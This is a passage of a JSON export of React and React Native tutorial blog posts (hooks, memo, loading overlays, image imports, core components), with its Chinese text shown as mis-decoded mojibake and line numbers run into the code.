ä½†é€™æ¨£çš„å•é¡Œåœ¨æ–¼ï¼Œä¸ç®¡æ€éº¼æ¨£æ¯æ¬¡ re-render çš„æ™‚å€™ doSomething éƒ½æœƒåœ¨é‡æ–°å®£å‘Šä¸€æ¬¡ï¼Œå³ä½¿ someState æ²’æœ‰è®Šä¹Ÿä¸€æ¨£ï¼Œé€™æ¨£ä¸æ˜¯å¾ˆæµªè²»å—ï¼Ÿæ˜æ˜æ²’æœ‰å¿…è¦ï¼Ÿ æ‰€ä»¥ useCallback å°±æ˜¯ç”¨ä¾†è§£æ±ºé€™å€‹å•é¡Œçš„ï¼Œå®ƒå¯ä»¥æŠŠä¸€å€‹ function çµ¦è¨˜ä½ï¼Œä½ åªè¦å‘Šè¨´å®ƒã€Œxxx æ”¹è®Šçš„æ™‚å€™å†å¹«æˆ‘é‡æ–°å®£å‘Šå°±å¥½äº†ã€ã€‚ é€™é‚Šé™„ä¸Šä¸€å€‹ç”¨ä¾†é©—è­‰çš„ç¯„ä¾‹ï¼š 1234567891011121314151617181920function App() { const [value, setValue] = useState(\"\"); // ä¸€å€‹æœ‰ç”¨ useCallbackï¼Œä¸€å€‹æ²’æœ‰ const logHello = () =&gt; console.log(\"Hello\"); const logHelloMemorized = useCallback(logHello, []); // æŠŠä¸€é–‹å§‹çš„ reference è¨˜èµ·ä¾† // ï¼ˆåˆ©ç”¨ useRef åœ¨ re-render å¾Œä¸æœƒè®Šçš„ç‰¹æ€§ï¼‰ const refLogHello = useRef(logHello); const refLogHelloMemorized = useRef(logHelloMemorized); return ( &lt;div className=\"App\"&gt; &lt;div&gt;Is same logHello: {refLogHello.current === logHello ? \"Yes\" : \"No\"}&lt;/div&gt; &lt;div&gt;Is same logHelloMemorized: {refLogHelloMemorized.current === logHelloMemorized ? \"Yes\" : \"No\"}&lt;/div&gt; &lt;input value={value} onChange={(e) =&gt; setValue(e.target.value)} /&gt; &lt;/div&gt; );} é€™é‚Šåˆ»æ„æ”¾äº†ä¸€å€‹ &lt;input&gt;ï¼Œç›®çš„æ˜¯è¦è®“æˆ‘åœ¨è¼¸å…¥æ–‡å­—æ™‚è§¸ç™¼ re-renderã€‚ æ‰€ä»¥åœ¨ re-render æ™‚ï¼ŒlogHello ç†æ‡‰å°±æœƒè¢«é‡æ–°å®£å‘Šä¸€æ¬¡ï¼Œè®Šæˆä¸€å€‹æ–°çš„ functionï¼Œè€Œ logHelloMemorized ä¸æœƒï¼Œå› ç‚ºå®ƒæœ‰ç”¨ useCallback åŒ…ä½ã€‚ å»ºè­°ä½ åˆ°æˆ‘å¯«çš„ ç¯„ä¾‹ å»è©¦è©¦çœ‹ï¼Œå†ä¾†æ€è€ƒæˆ‘é€™é‚Šèªªçš„æ„æ€æ‡‰è©²å°±èƒ½ç†è§£äº†ã€‚ è‡³æ–¼ dependencies è©²å‚³ä»€éº¼ï¼Ÿå°±è·Ÿ useEffect çš„é‚è¼¯å·®ä¸å¤šï¼Œåªè¦æ˜¯ function è£¡æœƒç”¨åˆ°çš„ state æˆ– props å¹¾ä¹éƒ½è¦æ”¾é€²å»ï¼Œä¸ç„¶å°±å¾ˆå®¹æ˜“å‡ºç¾ bugã€‚ ç‚ºä»€éº¼ï¼Ÿå› ç‚º function è£¡çš„å€¼æ˜¯èˆŠçš„ã€‚ useMemo æŠŠå›å‚³å€¼çµ¦è¨˜ä½ è·Ÿ useCallback ä¸€æ¨£æ˜¯ç”¨ä¾†å„ªåŒ–çš„ hookã€‚ ç°¡å–®ä¾†èªªï¼Œå¯ä»¥æŠŠè¤‡é›œçš„è¨ˆç®—æ”¾åœ¨ useMemo è£¡é¢ä¾†åšï¼Œç„¶å¾Œä¸€æ¨£çµ¦å®ƒ dependenciesï¼Œå‘Šè¨´å®ƒä»€éº¼æ±è¥¿æ”¹è®Šæ™‚åœ¨é‡æ–°è¨ˆç®—å°±å¥½ï¼Œé€™æ¨£å°±èƒ½çœä¸‹ä¸å¿…è¦çš„è¨ˆç®—ï¼š 123456789101112131415161718192021222324function App() { const [value, setValue] = useState(\"\"); // æ¯æ¬¡ re-render éƒ½æœƒè¢«åŸ·è¡Œ const veryComplexCalculate = () =&gt; { console.log('calculate') return 1 + 1 } // åªæœ‰ dependencies æ”¹è®Šæ™‚æ‰åŸ·è¡Œ const veryComplexCalculateByMemo = useMemo(() =&gt; { console.log('memo') return 100 + 100 }, []) return ( &lt;div className=\"App\"&gt; &lt;div&gt;Result1: {veryComplexCalculate()}&lt;/div&gt; &lt;div&gt;Result2: {veryComplexCalculateByMemo}&lt;/div&gt; &lt;input value={value} onChange={(e) =&gt; setValue(e.target.value)} /&gt; &lt;/div&gt; );} ä¸€æ¨£å¯ä»¥åˆ°æˆ‘å¯« ç¯„ä¾‹ åƒè€ƒï¼ˆè¨˜å¾—æ‰“é–‹ consoleï¼‰ useRef ä¸€å€‹ Mutable çš„å€¼ï¼Œåªæœ‰ä½ è‡ªå·±å»æ”¹å®ƒæ™‚å®ƒæ‰æœƒè®Šï¼Œè€Œä¸”ä¸æœƒè§¸ç™¼ re-render é™„è¨»ï¼šä¸æœƒè®Šçš„åŸç†æ˜¯å› ç‚º React åœ¨èƒŒå¾Œå¹«ä½ åšäº†ä¸€äº›äº‹æƒ…ï¼Œè®“æ¯æ¬¡ re-render éƒ½æœƒæ˜¯åŒä¸€å€‹ Object çš„ referenceã€‚ ä¸Šé¢çš„èªªæ³•æ²’æœ‰å¾ˆå®Œæ•´ï¼Œä½†æˆ‘è¦ºå¾—é€™æ¨£è¬›æœƒå¥½è¨˜ä¸€é»ï¼Œä¸€æ¨£ä¾†çœ‹å€‹ç¯„ä¾‹å§ï¼š 12345678910111213141516function App() { const [randomValue, serRandomValue] = useState(0); // {current: 0} const counter = useRef(0) // ç”¨ä¾†è§¸ç™¼ re-render const changeValue = () =&gt; serRandomValue(Math.random()) return ( &lt;div className=\"App\"&gt; &lt;div&gt;Ref: {counter.current}&lt;/div&gt; // å› ç‚ºæ˜¯ Mutable æ‰€ä»¥èƒ½ç›´æ¥æ”¹ &lt;button onClick={() =&gt; counter.current++}&gt;add 1 to ref&lt;/button&gt; &lt;button onClick={changeValue}&gt;Re-render&lt;/button&gt; &lt;/div&gt; );} é¦–å…ˆ useRef æœƒå»ºç«‹ä¸€å€‹ç‰©ä»¶ï¼Œå®ƒæœƒæœ‰ä¸€å€‹ current å±¬æ€§ï¼Œç”¨ä¾†å„²å­˜ä½ çµ¦çš„åˆå§‹å€¼ã€‚æ‰€ä»¥ä½ è¦å­˜å–æ±è¥¿éƒ½è¦ç”¨ .current ä¾†å–ï¼Œä¸ç„¶æœƒæ‹¿åˆ°æ•´å€‹ç‰©ä»¶ã€‚ å®ƒæœ€å¤§çš„ç‰¹é»å°±æ˜¯ã€ŒMutableã€ï¼Œæ‰€ä»¥ä½ å¯ä»¥ç›´æ¥æ”¹ï¼Œä¸ç”¨åƒæ”¹ state ä¸€æ¨£é‚„è¦å…ˆ copy ä¸€ä»½æ–°çš„æ‰è¡Œã€‚ é€™é‚Šä¸€æ¨£æœ‰å¯« ç¯„ä¾‹ ä¾†ç·´ç¿’ï¼Œå¯ä»¥åƒè€ƒçœ‹çœ‹ã€‚ é™¤äº†ä¸Šé¢é€™å€‹ç¯„ä¾‹ï¼Œå®ƒé‚„æœ‰ä¸€å€‹å¾ˆå¸¸æœƒæ‹¿ä¾†ç”¨çš„åœ°æ–¹ï¼šã€Œå„²å­˜ DOM å…ƒç´ ã€ 123456789101112131415161718192021function App() { const [flag, setFlag] = useState(true); // {current: null} const inputRef = useRef(null) useEffect(() =&gt; { // æ¯æ¬¡ render å®Œå¦‚æœæœ‰æŠ“åˆ° input å°± focus if (inputRef.current) { inputRef.current.focus(); } }); return ( &lt;div className=\"App\"&gt; // æŠŠ input ç¯€é»å­˜åˆ° useRef è£¡ { flag &amp;&amp; &lt;input ref={inputRef} /&gt;} // é»æŒ‰éˆ•å¯ä»¥æŠŠ input éš±è— or é¡¯ç¤º &lt;button onClick={() =&gt; setFlag(prev =&gt; !prev)}&gt;Toggle&lt;/button&gt; &lt;/div&gt; );} é€™é‚Šçš„ç¯„ä¾‹å¯ä»¥åˆ° é€™é‚Š è©¦ã€‚ ç¸½ä¹‹é€™èƒŒå¾Œçš„åŸç†æ˜¯ï¼Œåªè¦æŠŠä¸€å€‹ç‰©ä»¶æ”¾åœ¨ ref å±¬æ€§ä¸Šï¼ŒReact å°±æœƒè‡ªå‹•å¹«ä½ æŠŠ DOM å…ƒç´ æ”¾åˆ° current è£¡ï¼Œä½†ä¸€èˆ¬é‚„æ˜¯å»ºè­°ç”¨ useRef ä¾†å­˜æ¯”è¼ƒå¥½ã€‚ useImperativeHandle useRef çš„å»¶ä¼¸ é€™å€‹æ‡‰è©²ä¸å¤ªæœƒç”¨åˆ°ï¼Œåªè¦å¤§æ¦‚çŸ¥é“ä¸€ä¸‹å°±å¥½äº†ã€‚ é€™å€‹æ˜¯ç”¨åœ¨å¦‚æœæˆ‘æŠŠä¸€å€‹ Component æ‹†åˆ°æœ€å°å–®ä½ï¼Œåƒæ˜¯åªæœ‰ä¸€å€‹ &lt;input&gt;ï¼Œé‚£æˆ‘æœ‰æ²’æœ‰è¾¦æ³•åœ¨åœ¨çˆ¶å…ƒä»¶å»æ§åˆ¶å®ƒï¼Ÿè½èµ·ä¾†æœ‰é»è«åå¥‡å¦™å§ï¼Ÿæ‰€ä»¥ä¾†ç›´æ¥çœ‹ç¯„ä¾‹å§ï¼š 12345678910111213141516171819202122// æˆ‘æƒ³æ“æ§çš„é‚£å€‹ inputimport Myinput from \"./Myinput\";function App() { // ä¸€æ¨£è¦é€é useRef ä¾†å„²å­˜ DOM const inputRef = useRef(null); const focusInput = () =&gt; { // é€™é‚Šå¾…æœƒåœ¨è§£é‡‹ï¼Œä½ åªè¦çŸ¥é“é€™é‚Šçš„æ„æ€æ˜¯ç”¨ä¾† focus å°±å¥½äº† inputRef.current.yoyoyo(); } return ( &lt;div className=\"App\"&gt; // æŠŠé€™å€‹ Component å­˜åˆ° useRef &lt;Myinput ref={inputRef} /&gt; &lt;button onClick={focusInput}&gt;focus&lt;/button&gt; &lt;/div&gt; );}export default App; ç°¡å–®ä¾†èªªï¼Œ&lt;Myinput /&gt; åœ¨å»ºç«‹çš„æ™‚å€™å¯ä»¥æ±ºå®šè¦ export å“ªäº›ã€Œmethodã€ä¾†çµ¦çˆ¶å…ƒä»¶ç”¨ï¼Œé€™é‚Šæ˜¯ yoyoyoã€‚åå­—æ˜¯æˆ‘æ•…æ„äº‚å–çš„æ‰€ä»¥çœ‹èµ·ä¾†å¾ˆè©­ç•°ï¼Œä½†æˆ‘åªæ˜¯æƒ³è®“ä½ çŸ¥é“å®ƒæ˜¯å¯ä»¥è‡ªå®šç¾©çš„ï¼Œä¸ç”¨ä¸€å®šè¦ focusã€‚ æ¥è‘—ä¾†çœ‹ä¸€ä¸‹å­å…ƒä»¶çš„éƒ¨åˆ†å§ï¼š 123456789101112131415161718192021import { useRef, useImperativeHandle, forwardRef } from \"react\"function MyInput (props, ref) { const inputRef = useRef(null); useImperativeHandle(ref, () =&gt; { // export ä¸€å€‹ yoyoyoï¼Œå®ƒå¯ä»¥ focus åˆ°é€™å€‹ input return { yoyoyo: () =&gt; inputRef.current.focus() } }) return ( &lt;input type=\"text\" placeholder=\"type some thing...\" ref={inputRef} /&gt; )}export default forwardRef(MyInput) ç°¡å–®ä¾†èªªï¼Œé€™é‚Šä½ è¦åšä¸‰ä»¶äº‹æƒ…ï¼š æŠŠ DOM å…ƒç´ ç”¨ useRef å„²å­˜ è¨­å®š useImperativeHandleï¼ŒæŠŠè¦ export å‡ºå»çš„æ±è¥¿å¯«å¥½ æœ€å¾Œç”¨ forwardRef åŒ…èµ·ä¾† å°±é€™æ¨£å›‰ï¼Œæƒ³çœ‹ç¯„ä¾‹å¯ä»¥åˆ° é€™é‚Š useLayoutEffecté€™å€‹ä¹Ÿè·Ÿèª²ç¨‹è¬›çš„ä¸€æ¨£ï¼š render å®Œä»¥å¾Œï¼Œç€è¦½å™¨ paint å®Œå¾Œæƒ³åšä»€éº¼ å®ƒè·Ÿ useEffect åŸºæœ¬ä¸Šæ˜¯ä¸€æ¨£çš„æ±è¥¿ï¼Œåªå·®åœ¨ã€Œè§¸ç™¼çš„æ™‚æ©Ÿã€ä¸åŒï¼Œä¸€å€‹æ˜¯åœ¨ç•«é¢ paint å®Œä»¥å¾ŒåŸ·è¡Œï¼Œä¸€å€‹åœ¨ paint ä¹‹å‰ã€‚ é€™é‚Šçš„ç¤ºç¯„æœ‰é»é›£åšï¼Œä¸ç¢ºå®šæ˜¯ä¸æ˜¯ 18.0 æœ‰åšä¸€äº›å„ªåŒ–ï¼Œä¸èƒ½åšå‡ºã€Œé–ƒä¸€ä¸‹ã€çš„æ•ˆæœï¼Œæœ‰èˆˆè¶£çš„è©±å¯ä»¥åƒè€ƒ é€™ç¯‡ï¼Œè£¡é¢æœ‰ç¤ºç¯„ä»€éº¼æ˜¯ã€Œé–ƒä¸€ä¸‹ã€ã€‚ æˆ–ä½ ä¹Ÿå¯ä»¥åƒè€ƒæˆ‘å¯«çš„å¦ä¸€ç¨® ç¯„ä¾‹ï¼š 123456789101112131415161718192021222324import { useState, useEffect, useLayoutEffect } from \"react\";function App() { const [todos, setTodos] = useState([\"todo1\", \"todo2\", \"todo3\"]); // å¦‚æœæ˜¯ useLayoutEffect ç•«é¢å°±æœƒç­‰ 3 ç§’å¾Œæ‰ paint å‡ºä¾† // å¦‚æœæ˜¯ useEffect ç•«é¢æœƒç›´æ¥é¡¯ç¤ºï¼Œä¸æœƒå—åˆ°å½±éŸ¿ useLayoutEffect(() =&gt; { const target = new Date().getTime() + 3000; // ç­‰ä¸‰ç§’ while (new Date().getTime() &lt; target) {} console.log(\"finish\"); }, []); return ( &lt;div className=\"App\"&gt; &lt;ul&gt; {todos.map((todo) =&gt; ( &lt;li&gt;{todo}&lt;/li&gt; ))} &lt;/ul&gt; &lt;/div&gt; );} ç¸½ä¹‹ä½ åªè¦çŸ¥é“é€™å…©å€‹è§¸ç™¼çš„ã€Œæ™‚æ©Ÿé»ã€æ˜¯ä¸ä¸€æ¨£çš„å°±å¥½äº†ã€‚å¦å¤–ä¸€èˆ¬æœƒå»ºè­°èƒ½ç”¨ useEffect å°±ç”¨å®ƒï¼Œå°‘ç”¨ useLayoutEffectã€‚","link":"/2022/04/20/react-hooks-review/"},{"title":"React ç•¶åˆå§‹å€¼æ˜¯ API çš„è³‡æ–™æ€éº¼è¾¦ï¼Ÿ","text":"è¦æ…¢æ…¢ç¿’æ…£é€™å€‹ patternã€‚ ç°¡è¿°æˆ‘åŸæœ¬çš„æƒ³æ³•æ˜¯ç”¨ useState çš„ Lazy Initializers ä¾†è¼‰å…¥ï¼š 12345useState(async () =&gt; { const res = await fetch(...); const json = await res.json(); return json}) ä¸éé€™æ¨£æ˜¯è¡Œä¸é€šçš„ï¼ŒæŠŠã€ŒéåŒæ­¥ã€çš„æ±è¥¿æ”¾åœ¨é€™è£¡ React æ˜¯ä¸æœƒç­‰ response å›ä¾†çš„ã€‚ æ¯”è¼ƒå¸¸è¦‹çš„æ…£ä¾‹æ˜¯ç”¨ useEffect ä¾†ç™¼ APIï¼Œæ¥è‘—å†æ›´æ–° stateï¼š 123456789101112131415// æŠŠåˆå§‹å€¼æ”¹æˆç©ºé™£åˆ—const [ comments, setComments ] = useState([]);// æ‹¿åˆ° API ä»¥å¾Œå†æ›´æ–° stateuseEffect(() =&gt; { async function fetchComments() { try { const res = await fetch(API_ENDPOINT); const json = await res.json(); setComments(json); } catch (err) { setApiError(err); } } fetchComments();}, []) é›–ç„¶é€™æ¨£ç­‰æ–¼èªªï¼š render useEffect ç™¼ API æ‹¿è³‡æ–™ æ›´æ–° stateï¼Œre-render ç¬¬ä¸€æ¬¡çš„ render é¡¯å¾—æœ‰é»æµªè²»ï¼Œä¸éç›®å‰æƒ³ä¸åˆ°ä»€éº¼å…¶ä»–çš„è§£æ³•ï¼Œå¯èƒ½é€™å°±æ˜¯å¯« React çš„ pattern å§","link":"/2022/04/10/react-how-to-set-init-value/"},{"title":"åœ¨ React å¼•å…¥åœ–ç‰‡çš„æ–¹å¼","text":"ç¬¬ä¸€æ¬¡ç©é€™æ‹›ï¼Œå¾ˆé…·ã€‚ ç°¡è¿°å…¶å¯¦å¾ˆç›´è¦ºï¼Œç•¢ç«Ÿ Webpack å¾ˆå¼·å¤§ï¼š 1234import avatar from \"../../assets/PeaNu.jpg\"// å°±å¯ä»¥ç›´æ¥å¼•å…¥äº†&lt;MessageAvatar src={avatar}&gt;&lt;/MessageAvatar&gt;","link":"/2022/04/10/react-import-img/"},{"title":"åœ¨ React ä½¿ç”¨å…¨å± Loading æ•ˆæœ","text":"åˆ°å“ªéƒ½æœƒç”¨åˆ°çš„ Loadingã€‚ ç°¡è¿°1. å…ˆä¸‹è¼‰å¥—ä»¶ ä¾†æºï¼šhttps://www.npmjs.com/package/react-loading-overlay#styles-with-emotion 1npm install react-loading-overlay 2. ç”¨ styled component æ’°å¯«å…¨å±æ¨£å¼ é™„ code ä¹‹å‰å…ˆè§£é‡‹ä¸€ä¸‹é‚è¼¯ï¼ŒLoadingOverlay é è¨­çš„ HTML çµæ§‹é•·é€™æ¨£ï¼š div.wrapper å®¹å™¨ div.overlay è¼‰å…¥ç•«é¢ é€™è£¡è¨­å®šçš„æ±è¥¿æ˜¯ã€Œå®¹å™¨ã€ï¼Œå› ç‚ºå¸Œæœ›æœ‰å…¨å±æ•ˆæœï¼Œæ‰€ä»¥ä½¿ç”¨ fixed ä¾†åšï¼š 1234567const StyledLoader = styled(LoadingOverlay)` position: fixed; top: 0; right: 0; bottom: 0; left: 0;`; 3. æŠŠæ”¹å¥½çš„ Component æ”¾ä¸Šå» 1234567891011121314function App () { retrun ( {isLoading &amp;&amp; ( &lt;StyledLoader active={isLoading} spinner={true} text=\"Loading your content...\" &gt;&lt;/StyledLoader&gt; )} &lt;Component1 /&gt; &lt;Component2 /&gt; &lt;Component3 /&gt; )} è£œå……ï¼šä¹‹æ‰€ä»¥è¦ç”¨ &amp;&amp; æ¢ä»¶æ¸²æŸ“æ˜¯å› ç‚º LoadingOverlay é—œé–‰æ™‚ä¸¦ä¸æœƒæŠŠ div.wrapper ç§»é™¤ï¼Œè€Œ div.wrapper åˆæ­£å¥½æ”¾åœ¨æœ€é ‚å±¤ï¼Œç­‰æ–¼èªªæœƒè“‹åœ¨æ‰€æœ‰å…ƒç´ ä¹‹ä¸Šï¼Œæ²’è¾¦æ³•åšä»»ä½•æ“ä½œã€‚ æ‰€ä»¥æ‰å¾—åŠ ä¸Šæ¢ä»¶æ¸²æŸ“çš„æ–¹å¼ä¾†è§£æ±ºé€™å€‹å•é¡Œï¼Œä¸éè¦æ³¨æ„ç”¨é€™ç¨®æ–¹å¼çš„è©± fade çš„æ•ˆæœå°±æœƒæ¶ˆå¤±ã€‚ å¦‚æœä¸æƒ³é€™éº¼éº»ç…©çš„è©±ï¼Œå¯ä»¥æŠŠ CSS æ”¹æˆé€™æ¨£ï¼š 12345678910const StyledLoader = styled(LoadingOverlay)` // é¸åˆ°ä¸‹é¢çš„ div.overlay &amp; &gt; ._loading_overlay_overlay { position: fixed; top: 0; right: 0; bottom: 0; left: 0; }`; é€™æ¨£å°±å®Œæˆå›‰ï½ é™„è¨»é›–ç„¶ç…§ä¸Šé¢çš„ä½œæ³•æ‡‰è©²å°±æ²’å•é¡Œäº†ï¼Œä½†æ‡‰è©²æœƒä¸€ç›´å‡ºç¾ Warning è¨Šæ¯ï¼Œåƒé€™æ¨£ï¼š ç°¡å–®ä¾†èªªæ‡‰è©²æ˜¯ styles çš„ propType ä¸æ­£ç¢ºçš„é—œä¿‚ï¼Œä½†æˆ‘å°±æ²’æœ‰è¦å‚³ styleds å•Šï¼ æ‰€ä»¥å¾Œä¾†æ‰¾åˆ° é€™ç¯‡ çš„ issueï¼Œä½†ä½œè€…ä¼¼ä¹éƒ½ä¸å›æ‡‰äº†ï¼Œæ‰€ä»¥åªå¥½é€™æ¨£å­è§£ï¼š 12import LoadingOverlay from 'react-loading-overlay';LoadingOverlay.propTypes = undefined; æˆ–è€…ä¹Ÿå¯ä»¥ç”¨åˆ¥äººä¿®æ­£éå¾Œçš„ å¥—ä»¶ ä¾†è©¦è©¦çœ‹ã€‚","link":"/2022/04/10/react-loading-overlay/"},{"title":"React çš„ç¬¬äº”å€‹ hookï¼šmemo","text":"è·Ÿæ•ˆèƒ½æœ‰é—œçš„ hook ä¹‹ä¸€ã€‚ ç°¡è¿° æŠŠ Component çµ¦è¨˜èµ·ä¾†ï¼Œå¦‚æœ props æ²’æœ‰è®Šå°±ä¸æœƒ re-render ä¸€èˆ¬åœ¨çˆ¶å…ƒä»¶çš„ state æ”¹è®Šæ™‚ï¼Œæœƒé€£å¸¶åº•ä¸‹çš„æ‰€æœ‰å­å…ƒä»¶ re-renderï¼Œå¯æ˜¯æœ‰äº›æ™‚å€™ä¸éœ€è¦é˜¿ï¼Œå­å…ƒä»¶æ ¹æœ¬å°±æ²’æ”¹åˆ°ä»€éº¼å…§å®¹ï¼Œå¹¹å˜› re-renderï¼Ÿ é€™æ™‚å€™å°±å¯ä»¥ç”¨ memoï¼Œä¾†å°å­å…ƒä»¶åšä¸€å±¤åŒ…è£ï¼Œè®“å®ƒåªæœ‰åœ¨ props æ”¹è®Šæ™‚æ‰æœƒè·Ÿè‘— re-render é€™é‚Šå¯«äº†ä¸€å€‹ç°¡å–®çš„ä¾‹å­ï¼š 12345678910111213141516171819202122232425262728// ä¸€èˆ¬çš„ componentconst NormalComponent = ({ who }) =&gt; { // è¨ˆæ•¸å™¨ let counter = useRef(0) // æ¯æ¬¡ re-render å°±éå¢ counter.current++ return ( &lt;div&gt; {who} å·²ç¶“è¢« render äº† {counter.current} æ¬¡ &lt;/div&gt; )}// ç”¨äº† memo çš„ componentconst MemoComponent = memo(NormalComponent)function App() { const [value, setValue] = useState() const handleChange = (e) =&gt; setValue(e.target.value) return ( &lt;div className='app'&gt; &lt;input type='text' value={value} onChange={handleChange} /&gt; &lt;NormalComponent content='ä¸€èˆ¬çš„ Component' /&gt; &lt;MemoComponent content='Memo å¾Œçš„ Component' /&gt; &lt;/div&gt; )} NormalComponent å› ç‚ºæ²’æœ‰ç”¨ memo åŒ…è£ï¼Œæ‰€ä»¥æ¯æ¬¡çˆ¶å…ƒä»¶ re-render æ™‚éƒ½æœƒé€£å¸¶å½±éŸ¿ï¼Œè€Œ MemoComponent æœ‰ç”¨ memo åŒ…è£ï¼Œä¸¦ä¸”å®ƒçš„ propsï¼ˆcontentï¼‰ åœ¨ re-render æ™‚ä¸¦æ²’æœ‰æ”¹è®Šï¼Œæ‰€ä»¥ä¸æœƒè¢«é‡æ–°æ¸²æŸ“ã€‚ å¯æ˜¯è¦ç‰¹åˆ¥æ³¨æ„ï¼Œç•¶ props æ˜¯ Object çš„æ™‚å€™ï¼Œçµæœå¯èƒ½å°±æœƒå‡ºä¹ä½ é æ–™ï¼š 123456789101112131415function App() { const [value, setValue] = useState() const handleChange = (e) =&gt; setValue(e.target.value) // ä¸€å€‹è¦ç•¶ä½œ props çš„ function const handleSomething = () =&gt; {} return ( &lt;div className='app'&gt; &lt;input type='text' value={value} onChange={handleChange} /&gt; {/* å‚³é€²å» */} &lt;NormalComponent content='ä¸€èˆ¬çš„ Component' someObject={handleSomething} /&gt; &lt;MemoComponent content='Memo å¾Œçš„ Component' someObject={handleSomething} /&gt; &lt;/div&gt; )} å¤šå‚³ä¸€å€‹ function é€²å»å¾Œ memo å°±æ²’æ•ˆäº†ï¼ é€™æ™‚å€™å°±è¦å›æ†¶ä¸€ä¸‹è®Šæ•¸ã€Œå­˜å€¼ã€è·Ÿã€Œå­˜å€ã€çš„å·®åˆ¥äº†ï¼Œå¯ä»¥è¤‡ç¿’å»é€™ç¯‡ å¾ Object çš„ç­‰è™Ÿä¾†çœŸæ­£ç†è§£è®Šæ•¸ã€‚ ç¸½ä¹‹å‘¢ï¼Œåªè¦ä¸æ˜¯ Primitive å‹æ…‹çš„è®Šæ•¸ï¼Œå®ƒå­˜çš„éƒ½æ˜¯ referenceã€‚æ‰€ä»¥æ¯æ¬¡ re-render çš„æ™‚å€™éƒ½é‡æ–°å®£å‘Šäº† handleSometing é€™å€‹ functionï¼Œreact åœ¨è·Ÿä¸Šä¸€å€‹ function æ¯”å°æ™‚å°±æœƒæŠŠé€™å…©å€‹ function ç•¶ä½œæ˜¯ä¸ä¸€æ¨£çš„æ±è¥¿ï¼Œå¯ä»¥æƒ³æˆé€™æ¨£ï¼š 123const handleSomething1 = () =&gt; {}const handleSomething2 = () =&gt; {}console.log(handleSomething1 === handleSomething2) // false ä½†å¦‚æœæ˜¯ Primitive çš„è®Šæ•¸å°±ä¸æœƒæœ‰é€™å€‹å•é¡Œï¼Œå› ç‚ºï¼š 123console.log(2 === 2) // trueconsole.log('2' === '2') // trueconsole.log(true === true) // true ç¸½ä¹‹ï¼Œæƒ³ç”¨ memo å‰å¾—å…ˆç¢ºèª props æ˜¯å±¬æ–¼å“ªç¨®è³‡æ–™å‹æ…‹ï¼Œå¦‚æœæ˜¯ non-primitive çš„è©±å–®é  memo é€™å€‹æ–¹å¼æ˜¯æ²’ç”¨çš„ï¼Œå¾—åšä¸€äº›é¡å¤–è™•ç†æ‰è¡Œã€‚ ç¬¬ä¸€ç¨®è§£æ³•æ˜¯åœ¨ memo çš„ç¬¬äºŒå€‹åƒæ•¸å‚³å…¥ function ä¾†è‡ªè¨‚æ¯”è¼ƒ props çš„æ–¹å¼ï¼Œç¬¬äºŒç¨®æ–¹å¼æ˜¯æ”¹ç”¨æ”¹ç”¨ useCallbackã€‚ é€™é‚Šæœƒå»ºè­°ç”¨ useCallback ä¾†è™•ç†æ¯”è¼ƒå¥½ã€‚ å¯ä»¥åƒè€ƒï¼šReact çš„ç¬¬å…­å€‹ hookï¼šuseCallback","link":"/2022/04/07/react-memo/"},{"title":"React Native ä¸­çš„ Component èˆ‡ API","text":"ç¬¬ä¸€æ­¥éƒ½æ˜¯å¾é€™è£¡é–‹å§‹ã€‚ å®˜æ–¹æ–‡ä»¶æ€éº¼çœ‹ï¼Ÿé€™ç¯‡çµ•å°ä¸æœƒæŠŠæ‰€æœ‰æ±è¥¿å¸¶éä¸€éï¼Œæ‰€ä»¥ä½ è¦çŸ¥é“ç•¶ä½ éœ€è¦æŸå€‹åŠŸèƒ½æ™‚ï¼Œä½ è©²åˆ°å“ªè£¡å»æ‰¾è³‡æ–™ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œä»¥ é€™ä»½æ–‡ä»¶ ä¾†çœ‹çš„è©±ï¼Œä½ å¯ä»¥å¾é€™å¹¾å€‹æ–¹å‘ä¾†æ‰¾ï¼š Core Components è·Ÿ UI æœ‰é—œçš„è·¨å¹³å°å…ƒä»¶ Andriod Components åªèƒ½ç”¨åœ¨ Android IOS Components åªèƒ½ç”¨åœ¨ IOS å¦ä¸€å€‹çš„è©±å‰‡æ˜¯è·Ÿ Native åšæºé€šçš„ç›¸é—œ APIï¼Œå¯ä»¥åƒè€ƒé€™ä»½ï¼Œå¦‚æœæ²’æœ‰ç‰¹åˆ¥æ¨™æ³¨ Android æˆ– IOS çš„è©±å°±æ˜¯è·¨å¹³å°ã€‚ Component &lt;View&gt; å°±è·Ÿ HTML ä¸­çš„ div å¾ˆåƒï¼Œå¯ä»¥ç”¨ä¾†ç¾¤çµ„ä¸€å€‹å€å¡Š &lt;SafeAreaView&gt; å¯ä»¥è§£æ±º IOS çš„ç€æµ·æ“‹ä½çš„å•é¡Œ &lt;Text&gt; è·Ÿæ–‡å­—æœ‰é—œçš„æ±è¥¿ä¸€å®šè¦æ”¾åœ¨é€™è£¡é¢ &lt;Button /&gt; å¯ä»¥ç”¢ç”ŸåŸç”Ÿçš„æŒ‰éˆ•ï¼ˆæ³¨æ„æ˜¯ Self-Closing Tagï¼‰ &lt;TextInput /&gt; è¼¸å…¥æ¡† onChangeText å¯å–å¾—è¼¸å…¥å€¼ multiline å¯è¼¸å…¥å¤šè¡Œ placeholder èƒ½æ”¾ä½”ä½æ–‡å­— keyboardType å¯ä»¥è¨­å®šè¼¸å…¥æ¡†çš„é¡å‹ï¼ˆä¾‹å¦‚ï¼šnumbericï¼‰ &lt;ScrollView&gt; ç”¨é€™å€‹åŒ…ä½å¾Œæ‰æœƒé¡¯ç¤ºæ»¾è»¸ï¼Œä¸ç„¶æœƒè¢«æˆªæ–· &lt;Image /&gt; å¯ä»¥æ”¾åœ–ç‰‡ï¼Œé€é require çš„æ–¹å¼å¼•å…¥ &lt;Modal /&gt; å¯ä»¥å½ˆå‡ºäº’å‹•è¦–çª—ï¼ŒåŠ ä¸Š animationType=\"slide\" è³ªæ„Ÿæœƒä¸Šå‡ä¸€å€ &lt;ImageBackground /&gt; å¯ä»¥æ”¾èƒŒæ™¯åœ–ç‰‡ï¼Œä¸€æ¨£é€é require ä¾†å¼•å…¥ &lt;TouchableHighlight&gt; é»æ“Šæ•ˆæœï¼Œå¿…é ˆæ­é… onPress æ‰çœ‹å¾—å‡ºä¾† &lt;TouchableOpacity é»æ“Šæ•ˆæœï¼Œä½†å¯ä»¥ä¸æ­é… onPress &lt;TouchableWithoutFeedback&gt; å¯ä»¥ç”¨åœ¨éœ€è¦é»æ“Šï¼Œä½†ä¸éœ€è¦åé¥‹çš„äº‹æƒ…ä¸Šï¼Œä¾‹å¦‚ï¼šé—œé–‰å°éµç›¤ &lt;FlatList /&gt; 